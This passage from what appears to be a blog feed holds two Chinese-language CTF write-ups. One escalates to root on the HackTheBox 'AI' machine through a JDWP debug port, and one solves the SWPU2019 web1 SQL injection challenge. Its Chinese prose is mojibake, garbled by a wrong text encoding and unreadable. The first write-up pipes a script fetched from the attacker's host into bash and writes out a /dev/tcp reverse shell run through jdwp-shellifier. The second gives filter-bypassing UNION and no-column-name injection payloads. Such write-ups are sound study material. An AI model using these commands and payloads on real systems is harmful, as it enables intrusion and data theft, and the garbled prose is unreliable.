10.10.15.60:8000&#x2F;linpeas.sh | bash</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»linpeas.shçš„ç»“æœä¸­å¯ä»¥å‘ç°ä¸€ä¸ªJDWPçš„ç‚¹è¢«æ ‡çº¢äº†ã€‚<br>é‚£ä¹ˆjdwpæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æœç´¢ä¸€ä¸‹</p><blockquote><p>JDWPï¼ˆJava DEbugger Wire Protocolï¼‰ï¼šå³Javaè°ƒè¯•çº¿åè®®ï¼Œæ˜¯ä¸€ä¸ªä¸ºJavaè°ƒè¯•è€Œè®¾è®¡çš„é€šè®¯äº¤äº’åè®®ï¼Œå®ƒå®šä¹‰äº†è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•ç¨‹åºä¹‹é—´ä¼ é€’çš„ä¿¡æ¯çš„æ ¼å¼ã€‚è¯´ç™½äº†å°±æ˜¯JVMæˆ–è€…ç±»JVMçš„è™šæ‹Ÿæœºéƒ½æ”¯æŒä¸€ç§åè®®ï¼Œé€šè¿‡è¯¥åè®®ï¼ŒDebugger ç«¯å¯ä»¥å’Œ target VM é€šä¿¡ï¼Œå¯ä»¥è·å–ç›®æ ‡ VMçš„åŒ…æ‹¬ç±»ã€å¯¹è±¡ã€çº¿ç¨‹ç­‰ä¿¡æ¯</p></blockquote><p>è€Œè¿™æ˜¯æœ‰æ¼æ´åˆ©ç”¨çš„ã€‚æ¯”å¦‚çŸ¥é“åˆ›å®‡ä¸Šçš„<br><a href="https://www.seebug.org/vuldb/ssvid-89216" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89216</a></p><p>ç­‰ç­‰ï¼Œéƒ½æ˜¯jdwpçš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±ç”¨è¿™ä¸ªæ¼æ´ï¼Œå°è¯•æ‹¿åˆ°rootæƒé™ã€‚<br>é¦–å…ˆç¡®å®šä½¿ç”¨çš„å·¥å…·<br><a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p><figure class="highlight plain"><figcaption><span>shellæ¯”è¾ƒå¥½ã€‚æ‰€ä»¥å…ˆåœ¨alexaçš„é¶æœºçš„tmpç›®å½•ä¸‹æ”¾ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬test.shå†…å®¹å¦‚ä¸‹ï¼š</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.60&#x2F;9002 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure><p>ç„¶åç»™å…¶æ‰§è¡Œçš„æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test.sh</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ—¶åªéœ€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test.sh</span><br></pre></td></tr></table></figure><p>å…ˆæœ¬æœºç›‘å¬ä¸‹ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¼¹åˆ°alexaçš„shellã€‚</p><p>æ¥ä¸‹æ¥ç”¨åˆ°ä¸€ä¸ªæ–°å­¦åˆ°çš„å¤§æ‹›ï¼šç«¯å£è½¬å‘ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯æ¬¡sshç™»å½•è¿™ä¸€é¶æœºéƒ½è¦ç”¨æˆ·å¯†ç ï¼Œååˆ†éº»çƒ¦ã€‚è€Œä¸”å°†è¦åˆ©ç”¨çš„jdwpæ˜¯javaçš„debugåŠŸèƒ½ï¼Œæ®è¯´æ“ä½œæ—¶ååˆ†å®¹æ˜“æ–­å¼€ã€‚é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥æœ¬æœºå¤„ç†è¿™ä¸ªjdwpå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ç«¯å£è½¬å‘ã€‚åŸæœ¬è‡ªå·±ä»¥ä¸ºååˆ†å¤æ‚ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤ã€‚</p><p>é¦–å…ˆåœ¨é¶æœºä¸Šç¡®è®¤jdwpæ˜¯è¿è¡Œåœ¨8000ç«¯å£çš„ã€‚<br>é‚£ä¹ˆæˆ‘å…ˆè¿›å…¥tomcatçš„ç›®å½•ï¼ŒæŒ‰ä¸‹<code>~C</code>å°†ç›´æ¥è¿›å…¥sshï¼Œç„¶åå°†å…¶è½¬åˆ°localhostæ¥ç ”ç©¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-L 8000:localhost:8000</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a13.PNG" class="lazyload" data-srcset="a13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8000ç«¯å£"></p><p>è¿™æ—¶æˆ‘ä»¬åœ¨æœ¬æœºä¸Šä½¿ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -lntp</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸»æœºç›‘å¬çš„ç«¯å£ã€‚å°±ä¼šå‘ç°8000ç«¯å£å¤„äºç›‘å¬çŠ¶æ€äº†ï¼Œuseræ˜¯sshã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•è½¬å‘tomcatçš„8009å’Œ8080ç«¯å£åˆ°æœ¬åœ°ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥æµè§ˆå™¨è®¿é—®<code>localhost:8080</code>æ¥åˆ†ætomcatï¼ˆå½“ç„¶è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼‰</p><p>å½“ç„¶ï¼Œè¿™é‡Œè½¬å‘åˆ°æœ¬åœ°æœ¬æ¥åªæ˜¯æ–¹ä¾¿è°ƒè¯•ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥åœ¨æœ¬åœ°æ‰‹åŠ¨åˆ©ç”¨jdwpçš„æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ä¸ªbreakpointç”¨debugåŠŸèƒ½æ¥æ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯è¿™æ–¹é¢å®åœ¨ä¸ç†Ÿï¼ˆjavaç™½å­¦äº†ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥åˆ©ç”¨ä¸Šé¢çš„è„šæœ¬èˆ’æœå•Šã€‚<br>shellifierç”¨æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t ç›®æ ‡ä¸»æœºip -p jdwpè¿è¡Œç«¯å£ --cmd &quot;Your Command&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&#x2F;tmp&#x2F;test.sh&quot;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè½¬å‘äº†ipï¼Œç«¯å£æ‰€ä»¥ä½¿ç”¨çš„ipæ˜¯æœ¬åœ°ã€‚è€Œbreak-onè¿™ç‚¹æ–¹ä¾¿æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„æ–­ç‚¹ã€‚æœ€åçš„cmdæ‰§è¡Œæˆ‘ä»¬çš„åå¼¹shellã€‚<br>æœ¬æœºå†åº¦ç›‘å¬åæ‰§è¡Œè¿™ä¸ªè„šæœ¬<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a14.PNG" class="lazyload" data-srcset="a14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="root"><br>æˆåŠŸåå¼¹shellåˆ°æœ¬æœºã€‚å³å¯æ‹¿åˆ°root.txt</p><p>æ„Ÿè§‰ææƒè¿™æ–¹é¢è‡ªå·±è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯èƒ½å› ä¸ºå¤§éƒ¨åˆ†ctfæ¯”èµ›æ³¨é‡çš„ä¹Ÿåªæ˜¯getshellå±‚é¢ä¸Šçš„å§ï¼Œä¹‹åçš„æ“ä½œè¿˜è¦å¤šåŠ äº†è§£çŸ¥è¯†å­¦ä¹ å•Šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»SWPU2019-WEB1&amp;WEB4å­¦sqlæ³¨å…¥</title>
      <link href="2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/"/>
      <url>2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æ‰“ç®—è¿™å‡ å¤©é‡æ–°ä»å¤´å¼€å§‹å­¦ä¸‹sqlæ³¨å…¥çš„ï¼Œæ¯•ç«Ÿhgameweek1çš„wpéƒ½å·²ç»å†™å¥½äº†ï¼Œé¢˜èƒ½åšçš„éƒ½åšäº†ã€‚ä½†æ˜¯çŒ›ç„¶æƒ³èµ·ä»Šå¹´åœ¨æ··äº†ä¸‹GXYCTFå‰è¿˜å®æ‰“å®çš„æ‰“äº†GWCTFè·ŸSWPUCTFã€‚å½“æ—¶GWçš„é¢˜åšäº†ä¸¤é“webï¼Œä¸€é“phpéšæœºæ•°æ¼æ´ä¸€é“phpmyadmin getshellï¼Œæ²¡ä»€ä¹ˆå«é‡‘é‡å°±æ²¡å†™ã€‚è€Œä¸”äº‹åçœ‹å…¶ä»–é€‰æ‰‹å°±åªæœ‰ä¸€ä¸ªäººwebåšäº†ä¸‰é“ï¼Œå…¶ä½™åŸºæœ¬éƒ½æ˜¯1,2é“å°±è§‰å¾—æ²¡ä»€ä¹ˆå¤ç°å…¶ä»–é¢˜çš„å¿…è¦ï¼›swpuå°±å®Œå…¨ç›¸åäº†ï¼Œwebé¢˜éš¾åº¦å¯¹æˆ‘è€Œè¨€æœ‰äº›é«˜äº†ï¼Œè€Œä¸”è¿˜æœ‰å‘åœ¨é‡Œé¢ã€‚å½“æ—¶å°±åšäº†ä¸‰é“éšå†™é¢˜ï¼ˆè®°å¾—æ¯é“éšå†™éƒ½æ˜¯zipå‹é¢˜ç›®ï¼‰ï¼Œä¹‹åæ²¡æ¡ä»¶åä¹Ÿæ²¡æ—¶é—´å¤ç°ã€‚æ‰€ä»¥åœ¨æ­¤å†æ¬¡æ„Ÿè°¢buuojç»™äº†æˆ‘å¤ç°é¢˜ç›®çš„æœºä¼šâ€¦â€¦</p><a id="more"></a><p>æœ‰ä¸€è¯´ä¸€ï¼Œswpué¢˜ç›®éš¾å½’éš¾ï¼Œå®˜æ–¹wpè¿˜æ˜¯å¾ˆè¯¦ç»†çš„ã€‚</p><h1 id="web1-sqlæ³¨å…¥ï¼ˆunion-or-äºŒæ¬¡æ³¨å…¥-ï¼‰"><a href="#web1-sqlæ³¨å…¥ï¼ˆunion-or-äºŒæ¬¡æ³¨å…¥-ï¼‰" class="headerlink" title="web1(sqlæ³¨å…¥ï¼ˆunion or äºŒæ¬¡æ³¨å…¥ ï¼‰)"></a>web1(sqlæ³¨å…¥ï¼ˆunion or äºŒæ¬¡æ³¨å…¥ ï¼‰)</h1><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="sqlæ³¨å…¥"></p><p>è¿™é“é¢˜ç›®çš„ç‚¹åœ¨äºsqlæ³¨å…¥ã€‚å¼€å§‹çš„ç™»é™†æ¡†çŸ¥è¯†å¹Œå­ï¼Œæ³¨å†Œè´¦å·ç™»é™†è¿›å»åå°±ä¼šå‘ç°æœ‰ä¸€ä¸ªå¹¿å‘Šç”³è¯·çš„è¿™ä¸€æ“ä½œã€‚é€šå¸¸çœ‹åˆ°è¿™ç§å½¢å¼ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯sqlæ³¨å…¥æˆ–è€…æ˜¯xssã€‚FUZZä¸€ä¸‹åï¼Œå¯ä»¥ç¡®è®¤æ˜¯sqlã€‚<br>å°è¯•ç®€å•çš„æ³¨å…¥è¯­å¥ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨<code>/**/</code>ç»•è¿‡æˆåŠŸã€‚<br>å½“æ—¶è¿˜FUZZå‡ºæ¥äº†æŠ¥é”™æ³¨å…¥çš„å…³é”®å‡½æ•°ï¼Œä»¥åŠå¸¸è§çš„æ³¨é‡Šç¬¦å·ï¼Œå…³é”®å­—orä¹Ÿè¢«è¿‡æ»¤äº†ã€‚<br>å› æ­¤ï¼ŒæŒ‰ç…§è‡ªå·±çš„ç¬¬ä¸€æƒ³æ³•ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æœ€æ™®éçš„unionè”åˆæŸ¥è¯¢ï¼Œåªæ˜¯è¿™æ ·ä¼šé¢ä¸´å‡ ä¸ªé—®é¢˜ï¼š</p><p>1.æ³¨é‡Šè¢«è¿‡æ»¤å¸¦æ¥çš„é—­åˆé—®é¢˜<br>2.é¢å¯¹å¼ºè¿‡æ»¤çš„or,åé¢è¿›è¡Œæ³¨å…¥çˆ†å‡ºè¡¨ååŠåˆ—åçš„å¸¸è§„è¯­å¥ï¼š<code>union select group_concat(table_name) from information_schema.tables where table_schema=database()</code>å°†å­˜åœ¨informationä¸­çš„orè¢«è¿‡æ»¤çš„å¢ƒåœ°</p><p>äº‹å®ä¸Šï¼Œå¯¹äºç¬¬ä¸€ç‚¹çš„é—­åˆé—®é¢˜ï¼Œè‡ªå·±åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ç›¸å…³bypassæŠ€å·§ã€‚ç¡®åˆ‡è¯´ä¸ç®—æŠ€å·§ï¼Œåº”è¯¥æ˜¯åœ¨sqlæ³¨å…¥ä¸­å¯¹åº”å½“å…ˆåšçš„ç¬¬ä¸€æ­¥â€˜å¤åŸsqlæŸ¥è¯¢è¯­å¥â€™åæ‰€è¿›è¡Œçš„å¸¸è§„åˆ¤æ–­ã€‚<br>ç”±äºFUZZï¼Œæ—¶ï¼Œæˆ‘ä»¬åœ¨è¾“å…¥<code>-1&#39;</code>æ—¶å¾—åˆ°æŠ¥é”™ç»“æœï¼Œé‚£å¤åŸå‡ºæ¥çš„è¯­å¥åº”è¯¥æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ads where title &#x3D; &#39;$title&#39; limit 0,1;</span><br></pre></td></tr></table></figure><p>å› æ­¤é¢å¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¸ä½¿ç”¨è¿‡æ»¤å·ï¼Œä½¿ç”¨<code>&#39;</code>ï¼ˆå•å¼•å·ï¼‰é—­åˆå•å¼•å·æ˜¯æ°´åˆ°æ¸ æˆçš„ã€‚<br>é‚£ä¹ˆç°åœ¨å°±è¦å¼€å§‹fuzzå­—æ®µæ•°äº†â€¦â€¦é¦–å…ˆï¼Œå‘ç°<code>order by</code>çš„orä¹Ÿè¢«è¿‡æ»¤äº†,è½¬è€Œä½¿ç”¨<code>group by</code>ã€‚å¥½çš„ï¼Œè¿™é“é¢˜å½“æ—¶æœ€ä¸ºäººè¯Ÿç—…çš„åœ°æ–¹æ¥äº†ï¼Œé‚£å°±æ˜¯å®ƒå±…ç„¶æœ‰22ä¸ªå­—æ®µæ•°ï¼æˆ‘æƒ³äººæ‰‹å·¥ä½¿ç”¨è¯­å¥fuzzå‘ç°è¿™ä¹ˆå¤šå­—æ®µæ•°åº”è¯¥æ˜¯æ—©å°±æ€€ç–‘äººç”Ÿäº†å§ï¼Ÿå½“æ—¶ä¼°è®¡å¾ˆå¤šäººéƒ½å€’åœ¨è¿™é¢˜çš„å­—æ®µæ•°ä¸Šã€‚<br>FUZZå­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1</span><br></pre></td></tr></table></figure><p>æˆåŠŸåæ¥ä¸‹æ¥union selectå§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å­—æ®µ"><br>ç¡®è®¤äº†å›æ˜¾çš„æ˜¯2å’Œ3å¯¹åº”å­—æ®µã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å¦‚ä½•è§£å†³<code>information_schema</code>çš„é—®é¢˜å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»å®˜æ–¹wpä¸­å­¦åˆ°äº†bypass<code>information_schema</code>çš„æ–¹æ³•å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« <br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>ä»”ç»†æƒ³æƒ³ï¼Œinformation_schemaåœ¨æ³¨å…¥ä¸­ä¸å¯æˆ–ç¼ºçš„åŸå› æ— éæ˜¯å› ä¸ºå®ƒåŒ…å«äº†æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯table_schemaï¼Œtable_name.column_nameç­‰ç­‰ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„å­˜åœ¨å‘¢ï¼Ÿæ–‡ç« ä¸­æä¾›äº†ä¸€ç§è§£æ³•:<code>sys.schema_auto_increment_columns</code>è¯¥è§†å›¾çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯¹è¡¨è‡ªå¢IDçš„ç›‘æ§ã€‚å¦‚æœè¡¨ä¸­å­˜åœ¨è‡ªå¢id,é‚£ä¹ˆè¿™ä¸ªè§†å›¾å°±ä¼šåŒ…å«è¿™ä¸€ è¡¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„è§£æ³•æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>ç„¶åéš¾è¿‡äº†ï¼Œå›æ˜¾å±…ç„¶æ˜¯è¿™ä¸ªè¡¨ä¸å­˜åœ¨ï¼Ÿï¼ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™é“é¢˜åœ¨buuojä¸Šå°‘äº†å•¥ï¼Œæ¯•ç«Ÿæˆ‘ç”¨çš„è·Ÿå®˜æ–¹wpæ˜¯ä¸€æ ·çš„â€¦â€¦é‚£å°±æ²¡åŠæ³•äº†ï¼Œåªèƒ½ç›²çŒœä¸€äº›å¸¸è§è¡¨åï¼Œæ¯”å¦‚userï¼Œpasswordä¹‹ç±»çš„ã€‚è¿™é‡Œå°±å¼€ä¸ªå¤©çœ¼è¡¨ç¤ºæ˜¯usersè¡¨å§ã€‚<br>æ¥ä¸‹æ¥ç”±äºä¸çŸ¥é“åˆ—åï¼Œå¼•å…¥ä¸€ä¸ªä»¥å‰è‡ªå·±ä¸æ€ä¹ˆç†Ÿæ‚‰çš„ç‚¹ï¼šæ— åˆ—åæ³¨å…¥ï¼Œè¿™é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« è®²çš„å¾ˆå‡†ç¡®ï¼š<br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a><br>è¿™é‡Œç›´æ¥å¼•ç”¨å®ƒçš„æ•°æ®äº†ï¼š<br>æ™®é€šçš„sqlæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| id | name         | password                                 | email                       | birthdate  | added               |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">|  1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">|  2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">|  3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">|  4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">|  5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 ,6union select * from users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">| 1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">| 2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">| 3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">| 4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">| 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>è¿™æ—¶è‹¥è¦å¼•ç”¨ï¼Œä½¿ç”¨åå¼•å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;4&#96; from (select 1,2,3,4,5,6 union select * from users)a;</span><br></pre></td></tr></table></figure><p>åˆ™ä¼šå•ç‹¬æ‹¿åˆ°ç¬¬å››åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿæœ‰å…¶ä»–æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| b                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>å›åˆ°é¢˜ç›®ï¼Œä¸éš¾å¾—å‡ºæœ€ç»ˆpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 